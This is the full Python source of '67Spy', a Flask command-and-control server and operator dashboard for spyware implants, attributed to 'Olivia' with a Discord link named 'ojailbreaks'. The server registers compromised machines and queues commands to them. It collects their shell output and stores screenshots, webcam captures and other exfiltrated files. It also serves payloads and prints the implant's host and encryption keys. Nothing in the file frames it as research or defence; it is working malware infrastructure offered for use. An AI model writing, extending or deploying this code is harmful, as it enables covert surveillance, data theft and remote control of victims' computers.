# 67Spy C2 + Operator Dashboard
# Python 3.10+ | pip install flask cryptography waitress pillow
# Built by Olivia — https://discord.gg/ojailbreaks

import os, sqlite3, threading, time, hmac as _hmac, hashlib
import base64, json, re, socket, secrets, struct, io
from pathlib import Path
from functools import wraps
from flask import (Flask, request, Response, redirect, url_for,
                   render_template, session, abort, send_file, jsonify)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ── config ──────────────────────────────────────────────────────────────────
PORT          = int(os.environ.get("PORT", 8080))
AES_KEY       = bytes.fromhex(os.environ.get("AES_KEY",  "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"))
HMAC_KEY      = bytes.fromhex(os.environ.get("HMAC_KEY", "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe"))
API_TOKEN     = os.environ.get("API_TOKEN", secrets.token_hex(32))
DASH_USER     = os.environ.get("DASH_USER", "admin")
DASH_PASS     = os.environ.get("DASH_PASS", "changeme")
SECRET_KEY    = os.environ.get("SECRET_KEY", secrets.token_hex(32))
DB_PATH       = os.environ.get("DB_PATH", "67spy.db")
STALE_TIMEOUT = int(os.environ.get("STALE_TIMEOUT", 600))   # 10 min
MAX_UPLOAD    = 50 * 1024 * 1024                              # 50 MB
UUID_RE       = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$')

# registration rate-limiting: ip → (count, window_start)
_reg_limits   : dict[str, tuple[int, float]] = {}
_reg_lock     = threading.Lock()
REG_LIMIT     = 10   # per minute

FILES_DIR   = Path("files")
UPLOADS_DIR = Path("uploads")
FILES_DIR.mkdir(exist_ok=True)
UPLOADS_DIR.mkdir(exist_ok=True)

app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD

# ── database ─────────────────────────────────────────────────────────────────
_db_local = threading.local()

def get_db() -> sqlite3.Connection:
    if not hasattr(_db_local, "conn"):
        conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        _db_local.conn = conn
    return _db_local.conn

_db_init_lock = threading.Lock()
def init_db():
    with _db_init_lock:
        db = get_db()
        db.executescript("""
        CREATE TABLE IF NOT EXISTS clients (
            uuid        TEXT PRIMARY KEY,
            hostname    TEXT DEFAULT '',
            username    TEXT DEFAULT '',
            os_info     TEXT DEFAULT '',
            ip          TEXT DEFAULT '',
            proto_ver   TEXT DEFAULT '1',
            first_seen  REAL NOT NULL,
            last_seen   REAL NOT NULL,
            meta        TEXT DEFAULT '{}'
        );
        CREATE TABLE IF NOT EXISTS results (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            client_uuid TEXT NOT NULL,
            timestamp   REAL NOT NULL,
            result_type TEXT DEFAULT 'shell',
            output      TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tasks (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            client_uuid TEXT NOT NULL,
            task_text   TEXT NOT NULL,
            queued_at   REAL NOT NULL,
            sent_at     REAL
        );
        CREATE INDEX IF NOT EXISTS idx_results_client ON results(client_uuid, timestamp);
        CREATE INDEX IF NOT EXISTS idx_tasks_client   ON tasks(client_uuid, sent_at);
        """)
        db.commit()

# ── crypto helpers ───────────────────────────────────────────────────────────
def _hmac_sha256(key: bytes, data: bytes) -> bytes:
    return _hmac.new(key, data, hashlib.sha256).digest()

def _derive_client_key(client_uuid: str) -> bytes:
    """Per-client AES key: HMAC-SHA256(master_aes_key, uuid_bytes)."""
    return _hmac_sha256(AES_KEY, client_uuid.encode())

def _derive_client_hmac(client_uuid: str) -> bytes:
    return _hmac_sha256(HMAC_KEY, client_uuid.encode())

def aes_decrypt(key: bytes, data: bytes) -> bytes | None:
    """AES-256-GCM decrypt. data = nonce(12) || ciphertext+tag."""
    if len(data) < 13:
        return None
    try:
        return AESGCM(key).decrypt(data[:12], data[12:], None)
    except Exception:
        return None

def aes_encrypt(key: bytes, plaintext: bytes) -> bytes:
    nonce = os.urandom(12)
    return nonce + AESGCM(key).encrypt(nonce, plaintext, None)

def verify_sig(client_uuid: str, sig_hex: str, payload: bytes) -> bool:
    """Verify HMAC-SHA256(per_client_hmac_key, payload)."""
    try:
        expected = _hmac_sha256(_derive_client_hmac(client_uuid), payload)
        return _hmac.compare_digest(expected, bytes.fromhex(sig_hex))
    except Exception:
        return False

def verify_bearer(token: str) -> bool:
    return _hmac.compare_digest(token, API_TOKEN)

# ── auth decorators ──────────────────────────────────────────────────────────
def require_operator(f):
    @wraps(f)
    def wrapper(*a, **kw):
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer ") or not verify_bearer(auth[7:]):
            return Response("Unauthorized", 401)
        return f(*a, **kw)
    return wrapper

def require_login(f):
    @wraps(f)
    def wrapper(*a, **kw):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*a, **kw)
    return wrapper

def validate_uuid(uid: str) -> bool:
    return bool(UUID_RE.match(uid or ""))

def safe_join(base: str, *parts) -> str | None:
    base = os.path.realpath(base)
    target = os.path.realpath(os.path.join(base, *parts))
    return target if target.startswith(base + os.sep) or target == base else None

def reg_rate_ok(ip: str) -> bool:
    now = time.time()
    with _reg_lock:
        cnt, ws = _reg_limits.get(ip, (0, now))
        if now - ws > 60:
            cnt, ws = 0, now
        cnt += 1
        _reg_limits[ip] = (cnt, ws)
        return cnt <= REG_LIMIT

# ── bmp → png conversion ────────────────────────────────────────────────────
def bmp_to_png_bytes(bmp: bytes) -> bytes:
    try:
        from PIL import Image
        img = Image.open(io.BytesIO(bmp))
        out = io.BytesIO()
        img.save(out, format="PNG")
        return out.getvalue()
    except Exception:
        return bmp

# ── DB helpers ───────────────────────────────────────────────────────────────
_db_write_lock = threading.Lock()

def client_touch(uuid: str, **kwargs):
    db = get_db()
    with _db_write_lock:
        now = time.time()
        row = db.execute("SELECT uuid FROM clients WHERE uuid=?", (uuid,)).fetchone()
        if row:
            sets = ", ".join(f"{k}=?" for k in kwargs)
            vals = list(kwargs.values()) + [now, uuid]
            if sets:
                db.execute(f"UPDATE clients SET {sets}, last_seen=? WHERE uuid=?", vals)
            else:
                db.execute("UPDATE clients SET last_seen=? WHERE uuid=?", [now, uuid])
        else:
            cols = "uuid, first_seen, last_seen" + (", " + ", ".join(kwargs.keys()) if kwargs else "")
            placeholders = "?, ?, ?" + (", " + ", ".join("?" for _ in kwargs) if kwargs else "")
            vals = [uuid, now, now] + list(kwargs.values())
            db.execute(f"INSERT INTO clients ({cols}) VALUES ({placeholders})", vals)
        db.commit()

def client_exists(uuid: str) -> bool:
    return bool(get_db().execute("SELECT 1 FROM clients WHERE uuid=?", (uuid,)).fetchone())

def pop_task(uuid: str) -> str | None:
    db = get_db()
    with _db_write_lock:
        row = db.execute(
            "SELECT id, task_text FROM tasks WHERE client_uuid=? AND sent_at IS NULL ORDER BY id LIMIT 1",
            (uuid,)).fetchone()
        if row:
            db.execute("UPDATE tasks SET sent_at=? WHERE id=?", (time.time(), row["id"]))
            db.commit()
            return row["task_text"]
    return None

def push_task(uuid: str, task: str):
    db = get_db()
    with _db_write_lock:
        db.execute("INSERT INTO tasks (client_uuid, task_text, queued_at) VALUES (?,?,?)",
                   (uuid, task, time.time()))
        db.commit()

def store_result(uuid: str, output: str, rtype: str = "shell"):
    db = get_db()
    with _db_write_lock:
        db.execute("INSERT INTO results (client_uuid, timestamp, result_type, output) VALUES (?,?,?,?)",
                   (uuid, time.time(), rtype, output))
        db.commit()

# ── stale reaper ─────────────────────────────────────────────────────────────
def _reaper():
    while True:
        time.sleep(60)
        cutoff = time.time() - STALE_TIMEOUT
        db = get_db()
        with _db_write_lock:
            db.execute("DELETE FROM clients WHERE last_seen < ?", (cutoff,))
            db.commit()

# ═══════════════════════════════════════════════════════════════════════════════
# C2 ENDPOINTS
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/reg", methods=["POST"])
def reg():
    """Registration. Body (JSON, AES-encrypted + base64):
       { ver, uuid, hostname, username, os_info, sig }
       sig = hex(HMAC-SHA256(master_hmac, nonce+ciphertext))
    """
    if not reg_rate_ok(request.remote_addr):
        return Response("", 429)
    raw = request.get_data()
    if len(raw) > 4096:
        return Response("", 400)
    # sig is outer envelope: last 64 hex chars
    # format: base64(nonce+ct)\n<sig_hex>
    try:
        parts = raw.split(b"\n", 1)
        enc_b64 = parts[0]
        sig_hex = parts[1].decode().strip() if len(parts) > 1 else ""
        enc = base64.b64decode(enc_b64)
    except Exception:
        return Response("", 400)

    # Verify with master HMAC key (pre-registration, no per-client key yet)
    expected_sig = _hmac_sha256(HMAC_KEY, enc)
    try:
        if not _hmac.compare_digest(expected_sig, bytes.fromhex(sig_hex)):
            return Response("", 403)
    except Exception:
        return Response("", 403)

    plain = aes_decrypt(AES_KEY, enc)
    if plain is None:
        return Response("", 400)

    try:
        data = json.loads(plain)
        uuid = data["uuid"]
    except Exception:
        return Response("", 400)

    if not validate_uuid(uuid):
        return Response("", 400)

    client_touch(uuid,
        hostname  = str(data.get("hostname", ""))[:128],
        username  = str(data.get("username", ""))[:128],
        os_info   = str(data.get("os_info",  ""))[:256],
        ip        = request.remote_addr,
        proto_ver = str(data.get("ver", "1")))

    # Send per-client keys back, encrypted with master key
    per_aes  = _derive_client_key(uuid).hex()
    per_hmac = _derive_client_hmac(uuid).hex()
    resp_plain = json.dumps({"per_aes": per_aes, "per_hmac": per_hmac}).encode()
    enc_resp = aes_encrypt(AES_KEY, resp_plain)
    return Response(base64.b64encode(enc_resp), mimetype="text/plain")


@app.route("/task")
def task_poll():
    uid  = request.args.get("id", "")
    sig  = request.args.get("sig", "")
    ts_s = request.args.get("ts", "")
    if not validate_uuid(uid) or not client_exists(uid):
        return Response("", 204)

    # Verify beacon sig: HMAC(per_client_hmac, uid + ts)
    try:
        ts = int(ts_s)
        if abs(time.time() - ts) > 120:   # replay window: 2 min
            return Response("", 403)
    except ValueError:
        return Response("", 400)

    payload = f"{uid}{ts}".encode()
    if not verify_sig(uid, sig, payload):
        return Response("", 403)

    client_touch(uid)
    task = pop_task(uid)
    if not task:
        task = "type=noop\n"

    enc = aes_encrypt(_derive_client_key(uid), task.encode())
    return Response(base64.b64encode(enc), mimetype="text/plain")


@app.route("/result", methods=["POST"])
def result_post():
    raw = request.get_data()
    if len(raw) > MAX_UPLOAD:
        return Response("", 413)
    try:
        body     = json.loads(raw)
        uid      = body["id"]
        sig_hex  = body["sig"]
        enc_b64  = body["data"]
    except Exception:
        return Response("", 400)

    if not validate_uuid(uid) or not client_exists(uid):
        return Response("", 400)

    enc = base64.b64decode(enc_b64)
    if not verify_sig(uid, sig_hex, enc):
        return Response("", 403)

    plain = aes_decrypt(_derive_client_key(uid), enc)
    if plain is None:
        return Response("", 400)

    output = plain.decode("utf-8", errors="replace")
    rtype  = body.get("rtype", "shell")
    store_result(uid, output, rtype)
    client_touch(uid)
    return Response("ok", 200)


@app.route("/file/<path:filename>")
@require_operator
def serve_file(filename):
    path = safe_join(str(FILES_DIR.resolve()), filename)
    if path is None or not os.path.isfile(path):
        return Response("", 404)
    with open(path, "rb") as f:
        raw = f.read()
    uid = request.args.get("cid", "")
    key = _derive_client_key(uid) if validate_uuid(uid) else AES_KEY
    enc = aes_encrypt(key, raw)
    return Response(base64.b64encode(enc), mimetype="text/plain")


@app.route("/upload/<cid>/<filename>", methods=["POST"])
def receive_upload(cid, filename):
    if not validate_uuid(cid) or not client_exists(cid):
        return Response("", 400)

    raw = request.get_data()
    if len(raw) > MAX_UPLOAD:
        return Response("", 413)

    try:
        meta    = json.loads(raw)
        sig_hex = meta["sig"]
        enc_b64 = meta["data"]
    except Exception:
        return Response("", 400)

    enc = base64.b64decode(enc_b64)
    if not verify_sig(cid, sig_hex, enc):
        return Response("", 403)

    plain = aes_decrypt(_derive_client_key(cid), enc)
    if plain is None:
        return Response("", 400)

    # sanitise filename
    filename = re.sub(r"[^\w.\-]", "_", os.path.basename(filename))[:128]
    outdir = UPLOADS_DIR / cid
    outdir.mkdir(exist_ok=True)

    # convert BMP screenshots/webcam to PNG
    if filename.lower().endswith(".bmp") and plain[:2] == b"BM":
        png = bmp_to_png_bytes(plain)
        filename = filename[:-4] + ".png"
        plain = png

    outpath = outdir / filename
    outpath.write_bytes(plain)

    rtype = "screenshot" if "screenshot" in filename else ("webcam" if "webcam" in filename else "upload")
    store_result(cid, f"[upload] {filename} ({len(plain)} bytes)", rtype)
    client_touch(cid)
    return Response("ok", 200)


# ═══════════════════════════════════════════════════════════════════════════════
# OPERATOR API  (Bearer token)
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/op/clients")
@require_operator
def op_clients():
    rows = get_db().execute(
        "SELECT uuid, hostname, username, os_info, ip, first_seen, last_seen FROM clients ORDER BY last_seen DESC"
    ).fetchall()
    now = time.time()
    out = []
    for r in rows:
        out.append({
            "uuid":       r["uuid"],
            "hostname":   r["hostname"],
            "username":   r["username"],
            "os_info":    r["os_info"],
            "ip":         r["ip"],
            "first_seen": r["first_seen"],
            "last_seen":  r["last_seen"],
            "online":     (now - r["last_seen"]) < 60,
        })
    return jsonify(out)


@app.route("/op/task", methods=["POST"])
@require_operator
def op_task():
    body = request.get_json(force=True) or {}
    uid  = body.get("uuid", "")
    task = body.get("task", "")
    if not validate_uuid(uid):
        return Response("bad uuid", 400)
    if not client_exists(uid):
        return Response("unknown client", 404)
    if not task:
        return Response("empty task", 400)
    push_task(uid, task)
    return jsonify({"queued": True})


@app.route("/op/results/<cid>")
@require_operator
def op_results(cid):
    if not validate_uuid(cid):
        return Response("", 400)
    since = float(request.args.get("since", 0))
    rows = get_db().execute(
        "SELECT id, timestamp, result_type, output FROM results WHERE client_uuid=? AND timestamp>? ORDER BY timestamp DESC LIMIT 100",
        (cid, since)).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/op/info/<cid>")
@require_operator
def op_info(cid):
    if not validate_uuid(cid):
        return Response("", 400)
    row = get_db().execute("SELECT * FROM clients WHERE uuid=?", (cid,)).fetchone()
    if not row:
        return Response("", 404)
    return jsonify(dict(row))


@app.route("/op/uploads/<cid>/<filename>")
@require_operator
def op_get_upload(cid, filename):
    if not validate_uuid(cid):
        abort(400)
    filename = re.sub(r"[^\w.\-]", "_", os.path.basename(filename))
    path = safe_join(str((UPLOADS_DIR / cid).resolve()), filename)
    if path is None or not os.path.isfile(path):
        abort(404)
    mime = "image/png" if filename.endswith(".png") else \
           "image/bmp" if filename.endswith(".bmp") else "application/octet-stream"
    return send_file(path, mimetype=mime)


@app.route("/op/uploads/<cid>")
@require_operator
def op_list_uploads(cid):
    if not validate_uuid(cid):
        abort(400)
    d = UPLOADS_DIR / cid
    if not d.exists():
        return jsonify([])
    files = [{"name": f.name, "size": f.stat().st_size, "mtime": f.stat().st_mtime}
             for f in sorted(d.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True)]
    return jsonify(files)


@app.route("/op/delete/<cid>", methods=["DELETE"])
@require_operator
def op_delete_client(cid):
    if not validate_uuid(cid):
        abort(400)
    db = get_db()
    with _db_write_lock:
        db.execute("DELETE FROM clients WHERE uuid=?", (cid,))
        db.execute("DELETE FROM tasks WHERE client_uuid=?", (cid,))
        db.execute("DELETE FROM results WHERE client_uuid=?", (cid,))
        db.commit()
    return jsonify({"deleted": True})


# ═══════════════════════════════════════════════════════════════════════════════
# DASHBOARD (session auth)
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        # CSRF check
        form_csrf = request.form.get("csrf_token", "")
        sess_csrf = session.get("csrf_token", "")
        if not sess_csrf or not _hmac.compare_digest(form_csrf, sess_csrf):
            error = "Invalid request"
        else:
            u = request.form.get("username", "")
            p = request.form.get("password", "")
            if (_hmac.compare_digest(u, DASH_USER) and
                    _hmac.compare_digest(p, DASH_PASS)):
                session.clear()
                session["logged_in"] = True
                session["token"]     = API_TOKEN
                return redirect(url_for("dashboard"))
            error = "Invalid credentials"
    # generate fresh CSRF token on every GET (and on failed POST)
    csrf_token = secrets.token_hex(16)
    session["csrf_token"] = csrf_token
    return render_template("login.html", error=error, csrf_token=csrf_token)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/")
@require_login
def dashboard():
    return render_template("dashboard.html")


@app.route("/client/<cid>")
@require_login
def client_page(cid):
    if not validate_uuid(cid):
        abort(400)
    return render_template("client.html", cid=cid)


# ── startup ──────────────────────────────────────────────────────────────────
def detect_ip() -> str:
    railway_domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
    if railway_domain:
        return f"https://{railway_domain}"
    render_domain = os.environ.get("RENDER_EXTERNAL_HOSTNAME")
    if render_domain:
        return f"https://{render_domain}"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return f"http://{ip}:{PORT}"
    except Exception:
        return f"http://localhost:{PORT}"


if __name__ == "__main__":
    init_db()
    threading.Thread(target=_reaper, daemon=True).start()

    c2_addr = detect_ip()
    print("=" * 60)
    print(" 67Spy C2 — Built by Olivia — discord.gg/ojailbreaks")
    print("=" * 60)
    print(f" C2 address : {c2_addr}")
    print(f" Dashboard  : {c2_addr}/")
    print(f" Login      : {DASH_USER} / {DASH_PASS}")
    print(f" Stale evict: {STALE_TIMEOUT}s")
    print()
    print(" IMPLANT CONFIG:")
    print(f"   C2_HOST  → {c2_addr.replace('http://', '').replace('https://', '').split('/')[0]}")
    print(f"   AES_KEY  → {AES_KEY.hex()}")
    print(f"   HMAC_KEY → {HMAC_KEY.hex()}")
    print("=" * 60)

    from waitress import serve
    serve(app, host="0.0.0.0", port=PORT, threads=8)
